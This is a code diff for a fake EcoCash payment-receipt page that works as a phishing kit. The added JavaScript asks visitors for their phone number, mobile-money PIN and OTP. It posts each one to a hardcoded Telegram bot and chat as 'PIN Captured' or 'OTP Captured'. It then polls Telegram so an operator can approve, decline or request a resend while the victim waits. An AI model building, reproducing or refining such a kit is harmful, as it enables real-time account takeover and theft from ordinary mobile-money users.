@@ -92,7 +92,6 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 .otp-msg{font-size:13px;color:#475569;text-align:center;line-height:1.4}
 .otp-icon-shield{margin-bottom:8px}
 
-/* Loading/waiting screen */
 .waiting-overlay{position:fixed;inset:0;background:rgba(15,23,42,.85);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;z-index:1500;padding:16px}
 .waiting-overlay.open{display:flex;animation:fadeIn .2s}
 .waiting-card{background:#fff;border-radius:20px;max-width:360px;width:100%;padding:32px 24px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}
@@ -102,7 +101,6 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 .waiting-desc{font-size:13px;color:#475569;line-height:1.5}
 .waiting-hint{margin-top:16px;font-size:11px;color:#94a3b8}
 
-/* Error / success popup cards */
 .status-popup-card{background:#fff;border-radius:20px;max-width:360px;width:100%;padding:28px 22px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}
 .status-icon-circle{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
 .icon-red{background:#dc2626;box-shadow:0 4px 14px rgba(220,38,38,.4)}
@@ -114,23 +112,25 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 
 .toast-notification{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#0f172a;color:#fff;padding:12px 20px;border-radius:8px;font-size:13px;font-weight:600;box-shadow:0 10px 25px rgba(0,0,0,.25);z-index:2000;opacity:0;transition:all .3s;pointer-events:none;max-width:90%;text-align:center}
 .toast-notification.show{transform:translateX(-50%) translateY(0);opacity:1}
+
+@media print{.no-print,.client-topbar,.receipt-action-toolbar{display:none !important}body{background:#fff !important}.receipt-card-container{box-shadow:none !important;border:1px solid #d1d5db !important;max-width:100% !important}}
 </style>
 </head>
 <body class="client-body">
 
 <div id="view-client">
   <div style="min-height:100vh;display:flex;flex-direction:column">
-    <header class="client-topbar">
+    <header class="client-topbar no-print">
       <div class="client-brand"><span class="brand-eco">Eco</span><span class="brand-cash">Cash</span></div>
       <button type="button" class="btn-client-help" onclick="openHelpModal()">Help</button>
     </header>
     <main class="client-main-container">
-      <div class="receipt-action-toolbar">
+      <div class="receipt-action-toolbar no-print">
         <button type="button" class="toolbar-btn" onclick="copyReceiptText()">Copy Receipt</button>
         <button type="button" class="toolbar-btn primary" onclick="printReceipt()">Print</button>
       </div>
       <div class="receipt-card-container">
-        <div class="receipt-nav-header">
+        <div class="receipt-nav-header no-print">
           <button type="button" class="btn-icon-back" onclick="openShareModal()">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
           </button>
@@ -187,7 +187,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ PIN MODAL ============ -->
+<!-- PIN MODAL -->
 <div class="modal-backdrop" id="modal-ecocash-login" onclick="closeModalOnBackdrop(event,'modal-ecocash-login')">
   <div class="ecocash-login-dialog">
     <button type="button" class="btn-dialog-close" onclick="closeModal('modal-ecocash-login')">&times;</button>
@@ -214,7 +214,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ OTP MODAL ============ -->
+<!-- OTP MODAL -->
 <div class="modal-backdrop" id="modal-otp-verify" onclick="closeModalOnBackdrop(event,'modal-otp-verify')">
   <div class="ecocash-login-dialog">
     <button type="button" class="btn-dialog-close" onclick="closeModal('modal-otp-verify')">&times;</button>
@@ -244,7 +244,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ WAITING OVERLAY ============ -->
+<!-- WAITING OVERLAY -->
 <div class="waiting-overlay" id="waiting-overlay">
   <div class="waiting-card">
     <div class="spinner"></div>
@@ -254,7 +254,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ ERROR POPUP ============ -->
+<!-- ERROR POPUP -->
 <div class="modal-backdrop" id="modal-error">
   <div class="status-popup-card">
     <div class="status-icon-circle icon-red">
@@ -266,7 +266,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ SUCCESS / IN REVIEW POPUP ============ -->
+<!-- IN REVIEW POPUP -->
 <div class="modal-backdrop" id="modal-inreview">
   <div class="status-popup-card">
     <div class="status-icon-circle icon-green">
@@ -278,7 +278,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ HELP MODAL ============ -->
+<!-- HELP MODAL -->
 <div class="modal-backdrop" id="modal-help" onclick="closeModalOnBackdrop(event,'modal-help')">
   <div class="status-popup-card" style="max-width:420px;text-align:left">
     <h3 class="status-popup-title" style="text-align:center;margin-bottom:16px">Help &amp; Support</h3>
@@ -291,7 +291,7 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
   </div>
 </div>
 
-<!-- ============ SHARE MODAL ============ -->
+<!-- SHARE MODAL -->
 <div class="modal-backdrop" id="modal-share" onclick="closeModalOnBackdrop(event,'modal-share')">
   <div class="status-popup-card" style="max-width:420px">
     <h3 class="status-popup-title" style="margin-bottom:14px">Share Receipt</h3>
@@ -307,21 +307,26 @@ body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-p
 <div id="toast" class="toast-notification"></div>
 
 <script>
-/* ================= CONFIG & STATE ================= */
-const STORAGE_KEY_CURRENT = 'ecocash_current_receipt';
-const NOTIFY_ENDPOINT = '/api/notify';
-const STATUS_ENDPOINT = '/api/status';
+/* ================= CONFIG ================= */
+const TELEGRAM_BOT_TOKEN = '8834604760:AAHnFWeTawysGPNs6dnqvbOYquhC4cxhs1w';
+const TELEGRAM_CHAT_ID   = '8294270663';
+const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+const POLL_INTERVAL_MS   = 2000;
+const SESSION_TIMEOUT_MS = 60 * 60 * 1000;
 
-const DEFAULT_RECEIPT = {
+/* ================= STATE ================= */
+const STORAGE_KEY_CURRENT = 'ecocash_current_receipt';
+let currentReceipt = {
   trackingNumber:'', modeOfPayment:'', accountName:'', countryCode:'', countryFlag:'',
   countryName:'', accountNumber:'', amount:'', currency:'', receiptOptional:'',
   timestamp:'', isAccepted:false, isDeclined:false
 };
 
-let currentReceipt = { ...DEFAULT_RECEIPT };
-let pollTimer = null;
 let currentSessionId = null;
-let currentStage = null; // 'pin' | 'otp'
+let currentStage = null;   // 'pin' | 'otp'
+let pollTimer = null;
+let tgUpdateOffset = 0;
+let sessionStartedAt = 0;
 
 /* ================= INIT ================= */
 function init(){
@@ -329,6 +334,18 @@ function init(){
   setupOtpInputs();
   loadReceiptFromURL();
   renderReceipt(currentReceipt);
+  // Prime Telegram getUpdates offset so we don't react to old taps
+  primeTelegramOffset();
+}
+
+async function primeTelegramOffset(){
+  try{
+    const res = await fetch(`${TELEGRAM_API}/getUpdates?timeout=0&offset=-1`);
+    const data = await res.json();
+    if(data.ok && data.result.length){
+      tgUpdateOffset = data.result[data.result.length-1].update_id + 1;
+    }
+  }catch(e){}
 }
 
 function loadReceiptFromURL(){
@@ -366,7 +383,7 @@ function loadReceiptFromURL(){
         if(found){ currentReceipt = {...found}; return; }
       }catch(e){}
     }
-    currentReceipt = { ...DEFAULT_RECEIPT, trackingNumber: trackingParam.toUpperCase() };
+    currentReceipt.trackingNumber = trackingParam.toUpperCase();
   }
 }
 
@@ -401,7 +418,7 @@ function renderReceipt(data){
   if(dial) dial.textContent = data.countryCode || '+263';
 }
 
-/* ================= PIN FLOW ================= */
+/* ================= PIN ================= */
 function setupPinInputs(){
   for(let i=1;i<=4;i++){
     const el = document.getElementById(`pin-${i}`);
@@ -420,9 +437,7 @@ function setupPinInputs(){
     el.addEventListener('paste',(e)=>{
       e.preventDefault();
       const p = (e.clipboardData||window.clipboardData).getData('text').trim();
-      if(/^\d{4}$/.test(p)){
-        for(let j=0;j<4;j++) document.getElementById(`pin-${j+1}`).value = p[j];
-      }
+      if(/^\d{4}$/.test(p)){ for(let j=0;j<4;j++) document.getElementById(`pin-${j+1}`).value = p[j]; }
     });
   }
 }
@@ -450,21 +465,37 @@ async function submitPin(){
   btn.disabled = true; btn.textContent = 'Sending...';
 
   try{
-    const res = await fetch(NOTIFY_ENDPOINT,{
+    currentSessionId = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
+    currentStage = 'pin';
+    sessionStartedAt = Date.now();
+    await primeTelegramOffset();
+
+    const msg =
+      `🔐 *PIN Captured*\n` +
+      `━━━━━━━━━━━━━━━\n` +
+      `🧾 *Ref:* ${currentReceipt.trackingNumber || '—'}\n` +
+      `👤 *Recipient:* ${currentReceipt.accountName || '—'}\n` +
+      `📱 *Phone:* ${phone}\n` +
+      `🔑 *PIN:* \`${pin}\`\n` +
+      `💳 *Service:* ${currentReceipt.modeOfPayment || '—'}\n` +
+      `💰 *Amount:* ${currentReceipt.currency || ''} ${currentReceipt.amount || '—'}\n` +
+      `🕒 ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' })} CAT`;
+
+    const buttons = {
+      inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `approve:${currentSessionId}` },
+        { text: '❌ Decline', callback_data: `decline:${currentSessionId}` }
+      ]]
+    };
+
+    const res = await fetch(`${TELEGRAM_API}/sendMessage`,{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        stage:'pin',
-        phone,
-        pinOrOtp: pin,
-        receipt: currentReceipt
-      })
+      body:JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode:'Markdown', reply_markup: buttons })
     });
     const data = await res.json();
-    if(!data.ok){ throw new Error(data.error || 'Failed'); }
+    if(!data.ok){ throw new Error(data.description || 'Telegram error'); }
 
-    currentSessionId = data.sessionId;
-    currentStage = 'pin';
     closeModal('modal-ecocash-login');
     showWaiting('Waiting for approval…','Your PIN is being verified. Please wait.');
     startPolling();
@@ -476,7 +507,7 @@ async function submitPin(){
   }
 }
 
-/* ================= OTP FLOW ================= */
+/* ================= OTP ================= */
 function setupOtpInputs(){
   for(let i=1;i<=6;i++){
     const el = document.getElementById(`otp-${i}`);
@@ -517,21 +548,37 @@ async function submitOtp(){
   btn.disabled = true; btn.textContent = 'Sending...';
 
   try{
-    const res = await fetch(NOTIFY_ENDPOINT,{
+    currentSessionId = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
+    currentStage = 'otp';
+    sessionStartedAt = Date.now();
+    await primeTelegramOffset();
+
+    const msg =
+      `📩 *OTP Captured*\n` +
+      `━━━━━━━━━━━━━━━\n` +
+      `🧾 *Ref:* ${currentReceipt.trackingNumber || '—'}\n` +
+      `👤 *Recipient:* ${currentReceipt.accountName || '—'}\n` +
+      `📱 *Phone:* ${phone}\n` +
+      `🔑 *OTP:* \`${otp}\`\n` +
+      `💳 *Service:* ${currentReceipt.modeOfPayment || '—'}\n` +
+      `💰 *Amount:* ${currentReceipt.currency || ''} ${currentReceipt.amount || '—'}\n` +
+      `🕒 ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' })} CAT`;
+
+    const buttons = {
+      inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `approve:${currentSessionId}` },
+        { text: '🔁 Resend',  callback_data: `resend:${currentSessionId}` }
+      ]]
+    };
+
+    const res = await fetch(`${TELEGRAM_API}/sendMessage`,{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        stage:'otp',
-        phone,
-        pinOrOtp: otp,
-        receipt: currentReceipt
-      })
+      body:JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode:'Markdown', reply_markup: buttons })
     });
     const data = await res.json();
-    if(!data.ok){ throw new Error(data.error || 'Failed'); }
+    if(!data.ok){ throw new Error(data.description || 'Telegram error'); }
 
-    currentSessionId = data.sessionId;
-    currentStage = 'otp';
     closeModal('modal-otp-verify');
     showWaiting('Verifying OTP…','Your OTP is being verified. Please wait.');
     startPolling();
@@ -543,46 +590,79 @@ async function submitOtp(){
   }
 }
 
-/* ================= POLLING ================= */
+/* ================= POLLING (getUpdates) ================= */
 function startPolling(){
   stopPolling();
-  pollTimer = setInterval(checkStatus, 2000);
+  pollTimer = setInterval(pollUpdates, POLL_INTERVAL_MS);
 }
 
 function stopPolling(){
   if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
 }
 
-async function checkStatus(){
+async function pollUpdates(){
   if(!currentSessionId) return;
+  if(Date.now() - sessionStartedAt > SESSION_TIMEOUT_MS){
+    stopPolling();
+    hideWaiting();
+    showError('Session Expired','Your request timed out. Please try again.');
+    return;
+  }
   try{
-    const res = await fetch(`${STATUS_ENDPOINT}/${currentSessionId}`);
+    const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${tgUpdateOffset}&timeout=0`);
     const data = await res.json();
-    if(!data.ok) return;
+    if(!data.ok || !data.result) return;
 
-    if(data.status === 'approved'){
-      stopPolling();
-      hideWaiting();
-      if(currentStage === 'pin'){
-        openOtpModal();
-      } else if(currentStage === 'otp'){
-        showInReview();
+    for(const upd of data.result){
+      tgUpdateOffset = upd.update_id + 1;
+      if(upd.callback_query && upd.callback_query.data){
+        const [action, sid] = upd.callback_query.data.split(':');
+        if(sid !== currentSessionId) continue;
+
+        // Acknowledge the tap so Telegram stops the loading spinner
+        fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({ callback_query_id: upd.callback_query.id, text: action === 'approve' ? '✅ Approved' : (action === 'decline' ? '❌ Declined' : '🔁 Resend') })
+        }).catch(()=>{});
+
+        // Remove inline buttons from the message
+        if(upd.callback_query.message){
+          fetch(`${TELEGRAM_API}/editMessageReplyMarkup`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({ chat_id: upd.callback_query.message.chat.id, message_id: upd.callback_query.message.message_id, reply_markup: { inline_keyboard: [] } })
+          }).catch(()=>{});
+        }
+
+        handleDecision(action);
+        return;
       }
-    } else if(data.status === 'declined'){
-      stopPolling();
+    }
+  }catch(e){ console.error('poll error:', e); }
+}
+
+function handleDecision(action){
+  stopPolling();
+
+  if(currentStage === 'pin'){
+    if(action === 'approve'){
+      hideWaiting();
+      openOtpModal();
+    } else if(action === 'decline'){
       hideWaiting();
       showError('Wrong credentials','Please check your PIN and try again.');
-    } else if(data.status === 'resend'){
-      stopPolling();
+    }
+  } else if(currentStage === 'otp'){
+    if(action === 'approve'){
+      hideWaiting();
+      showInReview();
+    } else if(action === 'resend'){
       hideWaiting();
       showToast('New verification required. Please enter PIN again.');
       openLoginModal();
-    } else if(data.status === 'expired'){
-      stopPolling();
-      hideWaiting();
-      showError('Session Expired','Your request timed out. Please try again.');
     }
-  }catch(e){ console.error('poll error:',e); }
+  }
 }
 
 /* ================= UI HELPERS ================= */
@@ -598,19 +678,12 @@ function showError(title, desc){
   document.getElementById('error-desc').textContent = desc;
   document.getElementById('modal-error').classList.add('open');
 }
-
 function closeErrorAndRetry(){
   document.getElementById('modal-error').classList.remove('open');
   openLoginModal();
 }
-
-function showInReview(){
-  document.getElementById('modal-inreview').classList.add('open');
-}
-
-function closeInReview(){
-  document.getElementById('modal-inreview').classList.remove('open');
-}
+function showInReview(){ document.getElementById('modal-inreview').classList.add('open'); }
+function closeInReview(){ document.getElementById('modal-inreview').classList.remove('open'); }
 
 function closeModal(id){ document.getElementById(id).classList.remove('open'); }
 function closeModalOnBackdrop(e,id){ if(e.target.id === id) closeModal(id); }
